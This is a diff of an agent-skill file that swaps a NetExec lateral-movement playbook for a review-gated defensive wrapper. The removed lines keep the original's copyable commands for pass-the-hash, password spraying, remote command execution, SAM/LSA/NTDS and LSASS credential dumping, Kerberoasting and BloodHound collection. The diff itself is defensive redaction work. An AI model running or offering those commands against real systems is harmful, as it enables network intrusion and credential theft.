@@ -1,185 +1,56 @@
 ---
-name: Moving Laterally with NetExec
-description: Use NetExec for SMB, WinRM, LDAP, and MSSQL enumeration, password spraying,
-tags: [software-development, software-development, agent-skill, okf, netexec, lateral-movement, smb, password-spraying, credential-access, active-directory, winrm, post-exploitation, security]
+name: moving-laterally-with-netexec
+description: Review-gated defensive assessment wrapper for NetExec lateral-movement and credential-abuse risk. Use only for authorized network security planning, detection mapping, evidence boundaries, and remediation.
+tags: [agent-skill, okf, netexec, lateral-movement, active-directory, credential-access, smb, identity-security, security, review-gated]
 license: Apache-2.0
 type: Playbook
+title: Moving Laterally with NetExec
+domain: security-offensive
+risk_level: high
+requires_review: true
+source_family: anthropic-cybersecurity-skills
+source_license: Apache-2.0
+source_status: blocked-pending-redaction
 ---
 
 # Moving Laterally with NetExec
 
-> **Authorized Use Only:** This skill is for authorized penetration testing, red-team engagements, and educational labs only. NetExec authenticates to, executes code on, and extracts credentials from remote hosts. Running it against systems you do not own or lack explicit written authorization to test is illegal under computer-misuse laws (e.g. the US CFAA, UK Computer Misuse Act). Confirm scope and rules of engagement before use.
+This package-facing entry is blocked pending redaction and safety review.
 
-## Overview
+NetExec-style workflows can validate credentials at scale, enumerate domain and host access, perform password spraying, execute commands remotely, dump credential material, and support lateral movement. This repository must not expose a default executable procedure for authentication abuse, remote execution, credential dumping, password spraying, pass-the-hash, ticket abuse, or follow-on movement. Treat the upstream technique as reference-only unless an approved defensive assessment workspace has written scope, lockout-safety rules, evidence-handling boundaries, and human review controls.
 
-NetExec (`nxc`) is the actively maintained successor to CrackMapExec, a network-service swiss-army knife for assessing and exploiting Windows/Active Directory and Linux environments. It wraps Impacket and other libraries behind a unified CLI so an operator can authenticate against many hosts at once, validate harvested credentials, spray passwords, enumerate shares/users/policies, execute commands, and dump credentials — all while logging cleanly for reporting.
+## Allowed use in this repository
 
-NetExec is protocol-oriented: every invocation starts with a protocol module. As of the 2025 releases it supports **smb, winrm, mssql, ldap, ssh, ftp, wmi, rdp, vnc, and nfs**. Command execution (`-x`/`-X`) is available on SMB, WINRM, SSH, MSSQL, WMI and (since summer 2025) RDP. A built-in module system (`-M`) adds capabilities such as LAPS retrieval, LSASS dumping via `lsassy`, BloodHound collection, and share spidering.
+- Record authorization requirements, network/domain scope, account-safety limits, lockout constraints, and rules of engagement.
+- Plan defensive assessment scope for remote-service exposure, credential hygiene, identity controls, and lateral-movement monitoring.
+- Map NetExec-related risk to detections, controls, and remediation.
+- Preserve provenance, risk classification, review status, and package-safety rationale.
+- Help reviewers decide whether a future defensive-only workflow is safe to publish.
 
-For lateral movement specifically, NetExec maps directly to MITRE ATT&CK **T1021.002 (Remote Services: SMB/Windows Admin Shares)**: it authenticates over SMB (port 445), reaches `ADMIN$`/`C$`, and uses named-pipe or task-scheduler execution to run code on remote machines. The `(Pwn3d!)` marker in output signals that the supplied principal has local-admin code-execution rights on a host — the green light for lateral movement.
+## Disallowed use in this repository
 
-## When to Use
+- Do not provide copyable live-operation commands, password-spraying steps, pass-the-hash guidance, command-execution procedures, credential-dumping instructions, or lateral-movement workflows.
+- Do not include instructions for validating harvested credentials, finding administrative access, dumping SAM/LSA/NTDS material, collecting attack-path data for abuse, or pivoting across hosts.
+- Do not request, paste, store, transform, summarize, or enrich credentials, hashes, tickets, account secrets, dumped databases, or recovered credential artifacts.
+- Do not perform live domain, network, host, service, account, remote-execution, or credential actions from this skill.
+- Do not package this entry as publication-ready until a reviewer replaces it with a defensive-only workflow.
 
-- During an internal network penetration test after obtaining one or more valid credentials/hashes, to identify every host where those credentials grant admin access.
-- To perform controlled password spraying against a domain while respecting lockout thresholds.
-- To enumerate SMB shares, domain users, password policy, and loggedon sessions across a subnet in one sweep.
-- To execute commands or dump SAM/LSA/NTDS credentials on authorized targets during post-exploitation.
-- To collect BloodHound data or LAPS passwords using NetExec modules instead of separate tooling.
+## Safe reviewer checklist
 
-## Prerequisites
+1. Confirm written authorization, network/domain scope, rate limits, lockout policy, and evidence-retention rules.
+2. Confirm the task is defensive validation, detection engineering, incident-response scoping, identity-control review, or remediation planning.
+3. Keep procedural credential abuse, remote execution, password spraying, dumping, and lateral-movement detail out of the package-facing skill.
+4. Move any operational references to a controlled, non-default review artifact if they are retained at all.
+5. Verify that the final skill teaches defensive planning, detection, evidence handling, and remediation rather than execution.
+6. Require explicit human approval before any installer, catalog, or publisher surface presents this as usable automation.
 
-- A Linux operator host (Kali/Parrot/Ubuntu). Install via pipx (recommended):
-  ```bash
-  sudo apt install -y pipx git
-  pipx ensurepath
-  pipx install git+https://github.com/Pennyw0rth/NetExec
-  # verify
-  nxc --version
-  nxc smb --help
-  ```
-- Docker alternative:
-  ```bash
-  git clone https://github.com/Pennyw0rth/NetExec
-  cd NetExec
-  docker build -t netexec .
-  docker run --rm -it netexec smb --help
-  ```
-- Network reachability to target ports (445/SMB, 5985-5986/WinRM, 389-636/LDAP, 1433/MSSQL).
-- Valid credentials, NT hashes, or Kerberos tickets within an authorized scope.
-- A signed rules-of-engagement document and knowledge of the account-lockout policy before spraying.
+## Defensive review prompts
 
-## Objectives
+- Which remote-service protocols, hosts, admin paths, and identity scopes are authorized for defensive review?
+- Which controls reduce lateral-movement risk: local-admin minimization, credential guard, LAPS/gMSA, SMB hardening, network segmentation, MFA-resistant admin workflows, and tiered administration?
+- Which logs, EDR events, remote-service events, authentication patterns, lockout signals, and credential-dumping indicators should be inspected?
+- What remediation evidence can be collected without exposing or reproducing credentials, hashes, tickets, dumped secrets, or command-execution artifacts?
 
-- Validate harvested credentials across a host range and locate `(Pwn3d!)` admin access.
-- Enumerate shares, users, and password policy over SMB and LDAP.
-- Conduct lockout-safe password spraying with `--continue-on-success`.
-- Execute commands on authorized hosts and select an appropriate `--exec-method`.
-- Dump SAM, LSA, and NTDS credentials and collect them into the NetExec workspace.
-- Drive AD attacks (Kerberoasting, ASREPRoast, BloodHound collection) through LDAP modules.
+## Status
 
-## MITRE ATT&CK Mapping
-
-| Technique ID | Official Name | How NetExec Implements It |
-|--------------|---------------|---------------------------|
-| T1021.002 | Remote Services: SMB/Windows Admin Shares | Authenticates over SMB to `ADMIN$`/`C$` and executes code on remote hosts (`-x`, `--exec-method`) |
-| T1110.003 | Brute Force: Password Spraying | One password against many accounts with `--continue-on-success` |
-| T1003.002 | OS Credential Dumping: Security Account Manager | `--sam` dumps local SAM hashes |
-| T1003.004 | OS Credential Dumping: LSA Secrets | `--lsa` dumps LSA secrets and cached credentials |
-| T1003.006 | OS Credential Dumping: DCSync | `--ntds` via drsuapi extracts the domain database |
-| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | `ldap --kerberoasting` requests service tickets |
-| T1087.002 | Account Discovery: Domain Account | `--users`, `--rid-brute` enumerate domain accounts |
-| T1135 | Network Share Discovery | `--shares`, `-M spider_plus` enumerate accessible shares |
-
-## Workflow
-
-### 1. Validate credentials and find admin access
-Sweep a subnet with a credential pair or NT hash. A trailing `(Pwn3d!)` marks hosts where the principal has admin code execution — these are your lateral-movement targets.
-```bash
-# Cleartext password across a /24
-nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' -d corp.local
-
-# Pass-the-hash (NT only or LM:NT)
-nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
-nxc smb 10.10.10.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
-```
-
-### 2. Enumerate the environment
-Pull users, shares, password policy, loggedon sessions, and active sessions to plan movement.
-```bash
-nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --users
-nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol
-nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares
-nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --loggedon-users --sessions
-# RID brute for accounts when listing is blocked
-nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --rid-brute 10000
-```
-
-### 3. Password-spray safely
-Spray one password against a user list, staying under the lockout threshold. `--continue-on-success` keeps testing every account instead of stopping at the first hit.
-```bash
-# Discover the lockout policy FIRST
-nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol
-
-# Spray a single password across many users
-nxc smb dc01.corp.local -u users.txt -p 'Welcome2025!' --continue-on-success
-
-# Validate a credential set across the domain without bruteforcing
-nxc ldap dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
-```
-
-### 4. Execute commands on authorized hosts
-On `(Pwn3d!)` targets, run commands and choose a quieter execution channel when needed.
-```bash
-# Default execution
-nxc smb 192.168.1.50 -u Administrator -H <hash> -x 'whoami /all'
-
-# Pick an exec method: smbexec, wmiexec, atexec, mmcexec
-nxc smb 192.168.1.50 -u Administrator -H <hash> --exec-method wmiexec -x 'hostname'
-
-# PowerShell over WinRM (amsi-bypassed, base64-encoded transparently)
-nxc winrm 192.168.1.50 -u Administrator -H <hash> -X '$PSVersionTable'
-```
-
-### 5. Dump credentials
-Harvest local and domain credentials from authorized hosts to fuel further movement.
-```bash
-# Local SAM hashes and LSA secrets
-nxc smb 192.168.1.50 -u Administrator -H <hash> --sam --lsa
-
-# In-memory LSASS dump via the lsassy module
-nxc smb 192.168.1.50 -u Administrator -H <hash> -M lsassy
-
-# Domain database from a DC (DRSUAPI default, or VSS)
-nxc smb dc01.corp.local -u Administrator -H <hash> --ntds
-nxc smb dc01.corp.local -u Administrator -H <hash> --ntds vss
-```
-
-### 6. Drive AD attacks via LDAP and modules
-Use protocol modules to pivot to ticket attacks, delegation, LAPS, and BloodHound ingestion.
-```bash
-# Kerberoasting and ASREPRoasting
-nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --kerberoasting kerb.out
-nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --asreproast asrep.out
-
-# Read LAPS passwords where permitted
-nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' -M laps
-
-# Collect BloodHound data
-nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --bloodhound --collection All --dns-server 192.168.1.10
-
-# MSSQL command/query execution
-nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -q 'SELECT name FROM sys.databases'
-nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -x 'whoami'
-```
-
-### 7. Review the workspace and report
-NetExec stores results in a per-protocol SQLite workspace under `~/.nxc/`. Review captured credentials and admin relationships for the report.
-```bash
-nxc smb -L              # list SMB modules
-ls ~/.nxc/workspaces/
-nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares --log spray_results.log
-```
-
-## Tools and Resources
-
-| Tool | Purpose | Source |
-|------|---------|--------|
-| NetExec (`nxc`) | Multi-protocol network exploitation | https://github.com/Pennyw0rth/NetExec |
-| NetExec Wiki | Official docs and per-protocol flags | https://www.netexec.wiki/ |
-| Impacket | Underlying SMB/MSSQL/Kerberos libraries | https://github.com/fortra/impacket |
-| lsassy | Remote LSASS extraction (NetExec module) | https://github.com/login-securite/lsassy |
-| BloodHound CE | Graph analysis of collected AD data | https://github.com/SpecterOps/BloodHound |
-| NetExec Cheat Sheet | Command reference | https://www.stationx.net/netexec-cheat-sheet/ |
-
-## Validation Criteria
-
-- [ ] NetExec installed and `nxc --version` confirmed.
-- [ ] Account-lockout policy reviewed before any spraying.
-- [ ] Credentials validated across the in-scope host range.
-- [ ] `(Pwn3d!)` admin-access hosts enumerated and documented.
-- [ ] Shares, users, and password policy collected.
-- [ ] Password spraying performed under lockout thresholds with `--continue-on-success`.
-- [ ] Command execution tested with an appropriate `--exec-method`.
-- [ ] Credential dumping (`--sam`/`--lsa`/`--ntds`) performed only on authorized targets.
-- [ ] LDAP attacks (Kerberoasting/ASREPRoast/LAPS/BloodHound) executed where in scope.
-- [ ] Workspace results exported and included in the engagement report.
+Risk decision: high risk, requires review, blocked pending redaction.
